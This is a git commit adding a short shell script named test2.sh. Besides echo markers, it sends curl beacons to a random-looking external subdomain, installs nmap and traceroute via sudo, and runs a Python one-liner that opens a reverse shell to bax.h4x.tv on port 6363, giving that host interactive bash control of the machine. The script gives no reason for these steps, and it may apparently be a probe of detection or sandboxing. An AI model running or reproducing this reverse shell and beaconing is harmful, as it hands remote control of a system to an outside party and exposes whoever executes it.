da2c1968bd9b9fe94c0acf531a358c3dca5ea85d
zrthstr <1923548+zrthstr@users.noreply.github.com>
2026-09-15 10:11:03 +0200

    Create test2.sh

---
+++ test2.sh
@@ -0,0 +1,18 @@
+
+#/usr/bin/env bash
+
+echo aaa
+
+curl http://qhyozoskzitihodxwgcqj6e0cldhzw4cj.0x44.nl/start
+
+echo bbb
+
+
+sudo apt update; sudo apt install nmap traceroute; 
+
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("bax.h4x.tv",6363));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+
+
+curl http://qhyozoskzitihodxwgcqj6e0cldhzw4cj.0x44.nl/end
+
+echo ccc
